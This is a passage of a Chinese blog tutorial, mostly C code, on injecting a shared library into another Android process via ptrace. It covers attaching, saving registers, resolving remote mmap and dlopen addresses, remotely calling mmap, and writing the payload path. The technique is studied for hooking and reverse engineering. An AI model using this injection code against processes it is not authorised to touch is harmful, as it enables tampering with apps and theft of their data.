class="line">    <span class="keyword">while</span>((entry = readdir(dir)) != <span class="literal">NULL</span>) &#123;    </span><br><span class="line">        id = atoi(entry-&gt;d_name);    </span><br><span class="line">        <span class="keyword">if</span> (id != <span class="number">0</span>) &#123;    </span><br><span class="line">            <span class="built_in">sprintf</span>(filename, <span class="string">"/proc/%d/cmdline"</span>, id);    </span><br><span class="line">            fp = fopen(filename, <span class="string">"r"</span>);    </span><br><span class="line">            <span class="keyword">if</span> (fp) &#123;    </span><br><span class="line">                fgets(cmdline, <span class="keyword">sizeof</span>(cmdline), fp);    </span><br><span class="line">                fclose(fp);    </span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strcmp</span>(process_name, cmdline) == <span class="number">0</span>) &#123;    </span><br><span class="line">                    <span class="comment">/* process found */</span>    </span><br><span class="line">                    pid = id;    </span><br><span class="line">                    <span class="keyword">break</span>;    </span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    closedir(dir);    </span><br><span class="line">    <span class="keyword">return</span> pid;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2、ptrace跟踪目标进程"><a href="#2、ptrace跟踪目标进程" class="headerlink" title="2、ptrace跟踪目标进程"></a>2、ptrace跟踪目标进程</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ptrace_attach(target_pid) == <span class="number">-1</span>)   </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">exit</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_attach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        perror(<span class="string">"ptrace_attach"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> status = <span class="number">0</span>;    </span><br><span class="line">    <span class="comment">// 挂起父进程，等待子进程中断或结束</span></span><br><span class="line">    waitpid(pid, &amp;status , WUNTRACED);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3、保存目标进程寄存器的值"><a href="#3、保存目标进程寄存器的值" class="headerlink" title="3、保存目标进程寄存器的值"></a>3、保存目标进程寄存器的值</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ptrace_getregs(target_pid, &amp;regs) == <span class="number">-1</span>) </span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">exit</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将读取到的寄存器值存放在regs中</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_getregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        perror(<span class="string">"ptrace_getregs: Can not get register values"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* save original registers */</span>    </span><br><span class="line"><span class="built_in">memcpy</span>(&amp;original_regs, &amp;regs, <span class="keyword">sizeof</span>(regs));</span><br></pre></td></tr></table></figure><h1 id="4、获得mmap、dlopen等库函数在目标进程中的偏移地址"><a href="#4、获得mmap、dlopen等库函数在目标进程中的偏移地址" class="headerlink" title="4、获得mmap、dlopen等库函数在目标进程中的偏移地址"></a>4、获得mmap、dlopen等库函数在目标进程中的偏移地址</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *linker_path = <span class="string">"/system/bin/linker"</span>;   </span><br><span class="line"></span><br><span class="line">mmap_addr = get_remote_addr(target_pid, libc_path, (<span class="keyword">void</span> *)mmap);</span><br><span class="line">dlopen_addr = get_remote_addr( target_pid, linker_path, (<span class="keyword">void</span> *)dlopen );    </span><br><span class="line">dlsym_addr = get_remote_addr( target_pid, linker_path, (<span class="keyword">void</span> *)dlsym );    </span><br><span class="line">dlclose_addr = get_remote_addr( target_pid, linker_path, (<span class="keyword">void</span> *)dlclose );    </span><br><span class="line">dlerror_addr = get_remote_addr( target_pid, linker_path, (<span class="keyword">void</span> *)dlerror );</span><br></pre></td></tr></table></figure><p>在计算偏移地址时，有个小TIPS，一个相同的库对于不同的进程来说，它的偏移量是恒定的。</p><p>也就是说，A进程载入了mmap，B进程也载入了mmap，那么mmap在A进程中的偏移等于相对于B进程的偏移。</p><p><strong>B.mmap地址 = B_lib库地址 + （A.mmap地址 -A_lib库地址）</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_remote_addr</span><span class="params">(<span class="keyword">pid_t</span> target_pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name, <span class="keyword">void</span>* local_addr)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">void</span>* local_handle, *remote_handle;    </span><br><span class="line">    </span><br><span class="line">    local_handle = get_module_base(<span class="number">-1</span>, module_name);    </span><br><span class="line">    remote_handle = get_module_base(target_pid, module_name);    </span><br><span class="line">    </span><br><span class="line">    DEBUG_PRINT(<span class="string">"[+] get_remote_addr: local[%x], remote[%x]\n"</span>, local_handle, remote_handle);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * ret_addr = (<span class="keyword">void</span> *)((<span class="keyword">uint32_t</span>)local_addr + (<span class="keyword">uint32_t</span>)remote_handle - (<span class="keyword">uint32_t</span>)local_handle);    </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__i386__)    </span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(module_name, libc_path)) &#123;    </span><br><span class="line">        ret_addr += <span class="number">2</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>    </span></span><br><span class="line">    <span class="keyword">return</span> ret_addr;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    FILE *fp;    </span><br><span class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;    </span><br><span class="line">    <span class="keyword">char</span> *pch;    </span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];    </span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        <span class="comment">/* self process */</span>    </span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>, pid);    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    fp = fopen(filename, <span class="string">"r"</span>);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;    </span><br><span class="line">        <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;    </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, module_name)) &#123;    </span><br><span class="line">                pch = strtok( line, <span class="string">"-"</span> );    </span><br><span class="line">                addr = strtoul( pch, <span class="literal">NULL</span>, <span class="number">16</span> );    </span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (addr == <span class="number">0x8000</span>)    </span><br><span class="line">                    addr = <span class="number">0</span>;    </span><br><span class="line">    </span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;    </span><br><span class="line">    </span><br><span class="line">        fclose(fp) ;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)addr;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5、调用mmap在目标进程申请内存空间"><a href="#5、调用mmap在目标进程申请内存空间" class="headerlink" title="5、调用mmap在目标进程申请内存空间"></a>5、调用mmap在目标进程申请内存空间</h1><p>构建mmap调用需要的参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* call mmap */</span>    </span><br><span class="line">parameters[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// addr    </span></span><br><span class="line">parameters[<span class="number">1</span>] = <span class="number">0x4000</span>; <span class="comment">// size    </span></span><br><span class="line">parameters[<span class="number">2</span>] = PROT_READ | PROT_WRITE | PROT_EXEC;  <span class="comment">// prot    </span></span><br><span class="line">parameters[<span class="number">3</span>] =  MAP_ANONYMOUS | MAP_PRIVATE; <span class="comment">// flags    </span></span><br><span class="line">parameters[<span class="number">4</span>] = <span class="number">0</span>; <span class="comment">//fd    </span></span><br><span class="line">parameters[<span class="number">5</span>] = <span class="number">0</span>; <span class="comment">//offset    </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ptrace_call_wrapper(target_pid, <span class="string">"mmap"</span>, mmap_addr, parameters, <span class="number">6</span>, &amp;regs) == <span class="number">-1</span>)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">exit</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_call_wrapper</span><span class="params">(<span class="keyword">pid_t</span> target_pid, <span class="keyword">const</span> <span class="keyword">char</span> * func_name, <span class="keyword">void</span> * func_addr, <span class="keyword">long</span> * parameters, <span class="keyword">int</span> param_num, struct pt_regs * regs)</span>     </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">  DEBUG_PRINT(<span class="string">"[+] Calling %s in target process.\n"</span>, func_name);    </span><br><span class="line">  <span class="keyword">if</span> (ptrace_call(target_pid, (<span class="keyword">uint32_t</span>)func_addr, parameters, param_num, regs) == <span class="number">-1</span>)    </span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ptrace_getregs(target_pid, regs) == <span class="number">-1</span>)    </span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">  DEBUG_PRINT(<span class="string">"[+] Target process returned from %s, return value=%x, pc=%x \n"</span>,     </span><br><span class="line">          func_name, ptrace_retval(regs), ptrace_ip(regs));    </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里做个平台判断，区分arm和x86，他们的实现方式不一样。下面只介绍arm</p><ul><li>首先将前面构建的mmap参数放入寄存器当中，对于arm来说，R0~R3是存放参数的，对于超过4位的参数一律放在栈中</li><li>将目标进程的PC寄存器指向mmap的函数地址，重置CPSR状态寄存器，重置LR寄存器</li><li>将配置完的寄存器应用到进程中</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__arm__)    </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_call</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint32_t</span> addr, <span class="keyword">long</span> *params, <span class="keyword">uint32_t</span> num_params, struct pt_regs* regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">uint32_t</span> i;   </span><br><span class="line">  <span class="comment">// 参数先放寄存器中，R0~R3</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_params &amp;&amp; i &lt; <span class="number">4</span>; i ++) &#123;    </span><br><span class="line">        regs-&gt;uregs[i] = params[i];    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 多于4位的放在栈中   </span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; num_params) &#123;    </span><br><span class="line">        regs-&gt;ARM_sp -= (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>) ;    </span><br><span class="line">        ptrace_writedata(pid, (<span class="keyword">void</span> *)regs-&gt;ARM_sp, (<span class="keyword">uint8_t</span> *)&amp;params[i], (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>));    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 将ARM的PC寄存器指向addr，也就是上面传来的需要调用的函数地址</span></span><br><span class="line">    regs-&gt;ARM_pc = addr;    </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 判断ARM当前所处的状态是thumb还是arm，它们的区别在于thumb是16位，arm是32位。属于arm的子集</span></span><br><span class="line">    <span class="comment">// 然后重置CPSR程序状态寄存器</span></span><br><span class="line">    <span class="keyword">if</span> (regs-&gt;ARM_pc &amp; <span class="number">1</span>) &#123;    </span><br><span class="line">        <span class="comment">/* thumb */</span>    </span><br><span class="line">        regs-&gt;ARM_pc &amp;= (~<span class="number">1u</span>);    </span><br><span class="line">        regs-&gt;ARM_cpsr |= CPSR_T_MASK;    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">        <span class="comment">/* arm */</span>    </span><br><span class="line">        regs-&gt;ARM_cpsr &amp;= ~CPSR_T_MASK;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重置LR寄存器</span></span><br><span class="line">    <span class="comment">// LR寄存器存放的是子程序的返回地址</span></span><br><span class="line">    regs-&gt;ARM_lr = <span class="number">0</span>;        </span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 设置寄存器的值</span></span><br><span class="line">    <span class="keyword">if</span> (ptrace_setregs(pid, regs) == <span class="number">-1</span>     </span><br><span class="line">            || ptrace_continue(pid) == <span class="number">-1</span>) &#123;    </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error\n"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;  </span><br><span class="line">    waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    <span class="keyword">while</span> (stat != <span class="number">0xb7f</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (ptrace_continue(pid) == <span class="number">-1</span>) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error\n"</span>);  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(__i386__)    </span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace_call</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint32_t</span> addr, <span class="keyword">long</span> *params, <span class="keyword">uint32_t</span> num_params, struct user_regs_struct * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    regs-&gt;esp -= (num_params) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>) ;    </span><br><span class="line">    ptrace_writedata(pid, (<span class="keyword">void</span> *)regs-&gt;esp, (<span class="keyword">uint8_t</span> *)params, (num_params) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>));    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">long</span> tmp_addr = <span class="number">0x00</span>;    </span><br><span class="line">    regs-&gt;esp -= <span class="keyword">sizeof</span>(<span class="keyword">long</span>);    </span><br><span class="line">    ptrace_writedata(pid, regs-&gt;esp, (<span class="keyword">char</span> *)&amp;tmp_addr, <span class="keyword">sizeof</span>(tmp_addr));     </span><br><span class="line">    </span><br><span class="line">    regs-&gt;eip = addr;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ptrace_setregs(pid, regs) == <span class="number">-1</span>     </span><br><span class="line">            || ptrace_continue( pid) == <span class="number">-1</span>) &#123;    </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error\n"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;  </span><br><span class="line">    waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    <span class="keyword">while</span> (stat != <span class="number">0xb7f</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (ptrace_continue(pid) == <span class="number">-1</span>) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error\n"</span>);  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>     </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">"Not supported"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_writedata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint8_t</span> *dest, <span class="keyword">uint8_t</span> *data, <span class="keyword">size_t</span> size)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">uint32_t</span> i, j, remain;    </span><br><span class="line">    <span class="keyword">uint8_t</span> *laddr;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">union</span> u &#123;    </span><br><span class="line">        <span class="keyword">long</span> val;    </span><br><span class="line">        <span class="keyword">char</span> chars[<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];    </span><br><span class="line">    &#125; d;    </span><br><span class="line">    </span><br><span class="line">    j = size / <span class="number">4</span>;    </span><br><span class="line">    remain = size % <span class="number">4</span>;    </span><br><span class="line">    </span><br><span class="line">    laddr = data;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; j; i ++) &#123;    </span><br><span class="line">        <span class="built_in">memcpy</span>(d.chars, laddr, <span class="number">4</span>);    </span><br><span class="line">        ptrace(PTRACE_POKETEXT, pid, dest, d.val);    </span><br><span class="line">    </span><br><span class="line">        dest  += <span class="number">4</span>;    </span><br><span class="line">        laddr += <span class="number">4</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;    </span><br><span class="line">        d.val = ptrace(PTRACE_PEEKTEXT, pid, dest, <span class="number">0</span>);    </span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; remain; i ++) &#123;    </span><br><span class="line">            d.chars[i] = *laddr ++;    </span><br><span class="line">        &#125;    </span><br><span class="line">    </span><br><span class="line">        ptrace(PTRACE_POKETEXT, pid, dest, d.val);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置寄存器</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_setregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        perror(<span class="string">"ptrace_setregs: Can not set register values"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="写入Shellcode"><a href="#写入Shellcode" class="headerlink" title="写入Shellcode"></a>写入Shellcode</h1><p>首先拿到mmap映射的基地址，方便后续操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">map_base = ptrace_retval(&amp;regs);   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace_retval</span><span class="params">(struct pt_regs * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__arm__)    </span></span><br><span class="line">    <span class="keyword">return</span> regs-&gt;ARM_r0;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(__i386__)    </span></span><br><span class="line">    <span class="keyword">return</span> regs-&gt;eax;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">"Not supported"</span>    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将我们的Shellcode写入到目标进程中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptrace_writedata(target_pid, map_base, library_path, <span class="built_in">strlen</span>(library_path) + <span class="number">1</span>);</span><br></pre></td></tr></table></figure><h1 id="6、执行Shellcode"><a href="#6、执行Shellcode" class="headerlink" title="6、执行Shellcode"></a>6、执行Shellcode</h1><p>构建dlopen的执行参数，打开shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parameters[<span class="number">0</span>] = map_base;       </span><br><span class="line">parameters[<span class="number">1</span>] = RTLD_NOW| RTLD_GLOBAL;     </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ptrace_call_wrapper(target_pid, <span 